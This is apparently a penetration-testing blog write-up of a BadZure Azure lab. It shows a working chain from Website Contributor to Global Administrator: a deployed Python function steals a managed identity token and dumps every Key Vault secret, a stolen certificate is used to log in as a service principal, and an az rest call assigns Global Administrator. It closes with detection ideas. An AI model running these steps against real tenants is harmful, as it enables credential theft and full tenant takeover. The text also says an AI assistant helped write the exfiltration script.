---
title: "BadZure: Managed Identity Abuse via Function App (Flex Consumption)"
date: 2026-05-14 00:04:00 +0000
categories: [Azure, Pentesting]
tags: [azure, managed-identity, function-app, flex-consumption, badzure, key-vault, imds]
---

## Overview

**Technique:** Managed Identity Abuse via Function App Code Deployment  
**Initial Access:** Website Contributor on Azure Function App  
**Outcome:** Global Administrator via certificate theft from Key Vault  
**Environment:** BadZure lab, Azure Flex Consumption Function App  

---

## Attack Chain

```
Website Contributor (elmo)
        ↓
Deploy malicious function code
        ↓
Function App Managed Identity → Key Vault (Key Vault Secrets User)
        ↓
Read certificate + client ID from Key Vault secrets
        ↓
Authenticate as PrimeScaffold (AppRoleAssignment.ReadWrite.All)
        ↓
Assign Global Administrator → Tenant Owned
```

---

## Step 1 - Initial Enumeration

I am given creds for  user `delphine.skaar` with Website Contributor on `func-payment-processor-9qst`. Next proceed with enumeration

```bash
az role assignment list --assignee delphine.skaar@<tenant> --all --output table
```

Key findings:
- `Reader` at subscription scope
- `Website Contributor` on the function app resource

Next check the function app's managed identity:

```powershell
az functionapp identity show --name func-payment-processor-9qst --resource-group AppConfig-Platform-RG
```

MI principal ID: `b1a13fcc-901f-4692-ad2e-9d41aec7ba3f`

Check MI role assignments:

```powershell
az role assignment list --assignee b1a13fcc-901f-4692-ad2e-9d41aec7ba3f --all --output table
```

Findings:
- `Key Vault Secrets User` on `Legal-Comp-KV979g`
- `Key Vault Certificate User` on `Legal-Comp-KV979g`
- `Key Vault Reader` on `Legal-Comp-KV979g`

---

## Step 2 - Malicious Function Deployment

Website Contributor grants `Microsoft.Web/sites/write` which allows deploying code to the function app. The plan is to deploy a Python function that queries the Instance Metadata Service (IMDS) to obtain a managed identity token and uses it to read secrets from the Key Vault.

**Key finding:** Flex Consumption function apps do not use the standard IMDS endpoint `169.254.169.254`. Instead they expose `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` environment variables pointing to `http://169.254.255.2:8081/msi/token`. You can learn more about function apps on Microsoft Learn, there are also refrences on docs for building function apps. The one source that really helped here was a guide from Azure Functions for Visual Studio Code on marketplace. 

These are some links I recommend checking out for better understanding of function apps:

<https://learn.microsoft.com/en-us/training/modules/explore-azure-functions/>

<https://learn.microsoft.com/en-us/training/modules/develop-azure-functions/>

<https://learn.microsoft.com/en-us/azure/azure-functions/functions-reference-python?pivots=python-mode-decorators>

<https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurefunctions>



I had claude help with the script for exfiltrating the MI token which I then deployed through VS Code

```python
import azure.functions as func
import requests
import json
import os

app = func.FunctionApp(http_auth_level=func.AuthLevel.ANONYMOUS)

@app.route(route="httptrigger")
def httptrigger(req: func.HttpRequest) -> func.HttpResponse:
    identity_endpoint = os.environ.get("IDENTITY_ENDPOINT")
    identity_header = os.environ.get("IDENTITY_HEADER")

    token_resp = requests.get(
        identity_endpoint,
        params={"api-version": "2019-08-01", "resource": "https://vault.azure.net"},
        headers={"X-IDENTITY-HEADER": identity_header},
        timeout=10
    ).json()

    token = token_resp["access_token"]
    headers = {"Authorization": f"Bearer {token}"}
    vault = "https://legal-comp-kv979g.vault.azure.net"

    secrets = requests.get(f"{vault}/secrets?api-version=7.4", headers=headers).json()
    results = {}
    for item in secrets.get("value", []):
        name = item["id"].split("/")[-1]
        val = requests.get(f"{vault}/secrets/{name}?api-version=7.4", headers=headers).json()
        results[name] = val.get("value", "error")

    return func.HttpResponse(json.dumps(results), mimetype="application/json")
```



Triggered via:
```
GET https://func-payment-processor-9qst.azurewebsites.net/api/httptrigger
```

You can get the trigger url from VS Code too as described in the guide.

---

## Step 3 - Key Vault Secret Exfiltration

Function returned:

```json
{
  "mi-certificate-PrimeScaffold": "<base64 PFX>",
  "mi-client-id-PrimeScaffold": "ca8e1dfa-ad37-4a24-8904-472d0947c2f4",
  "_identity_endpoint": "http://169.254.255.2:8081/msi/token"
}
```

Extracted certificate and private key from the PFX:

```bash
echo "<base64>" | base64 -d > PrimeScaffold.pfx
openssl pkcs12 -in PrimeScaffold.pfx -nocerts -nodes -out ps_key.pem -passin pass:
openssl pkcs12 -in PrimeScaffold.pfx -nokeys -out ps_cert.pem -passin pass:
cat ps_cert.pem ps_key.pem > ps_combined.pem
```

I made the combined pem on Linux but I transfrered it on Windows where az cli handles auth better with the pem certificate among other things.

---

## Step 4 - Authenticate as PrimeScaffold

```powershell
az login --service-principal -u "ca8e1dfa-ad37-4a24-8904-472d0947c2f4" --certificate ps_combined.pem --tenant "97b078cd-..." --allow-no-subscriptions
```

Enumerated permissions:

```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/servicePrincipals/<spId>/appRoleAssignments"
```

PrimeScaffold has `AppRoleAssignment.ReadWrite.All` (`06b708a9`) this allows assigning any Graph API role to any principal.

---

## Step 5 - Privilege Escalation to Global Administrator

Authenticated as PrimeScaffold I can just assign myself Global Administrator role

```powershell
$body = @{
    principalId   = "<target-user-object-id>"
    resourceId    = "216e59bf-6c38-42b9-9211-734fe4d2f3bb"  # Microsoft Graph SP
    appRoleId     = "62e90394-69f5-4237-9190-012177145e10"  # Global Administrator
} | ConvertTo-Json

az rest --method POST `
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/216e59bf-6c38-42b9-9211-734fe4d2f3bb/appRoleAssignedTo" `
  --headers "Content-Type=application/json" `
  --body $body
```

---

## Key Takeaways

**Why this works:**
- Website Contributor allows code deployment but is rarely considered a high-risk role
- Function app managed identities are often over-privileged (Key Vault access)
- Credentials stored in Key Vault secrets are reachable from any identity with Secrets User
- `AppRoleAssignment.ReadWrite.All` is a tenant takeover primitive any SP with this permission can escalate to Global Admin

**Flex Consumption IMDS note:**  
Standard `169.254.169.254` IMDS does not work on Flex Consumption plans. Use `IDENTITY_ENDPOINT` + `IDENTITY_HEADER` environment variables with `api-version=2019-08-01` and `X-IDENTITY-HEADER` header instead.

**Detection opportunities:**
- Function app code changes (Deployment events in Activity Log)
- Unusual IMDS/MSI token requests from function app
- Key Vault secret reads by function app MI outside normal hours
- `AppRoleAssignment.ReadWrite.All` granted to non-admin service principals
- Global Administrator role assignments by unexpected principals

---

## Tools Used
- az cli
- VS Code Azure Functions extension
- openssl
- Azure portal (Deployment Center)
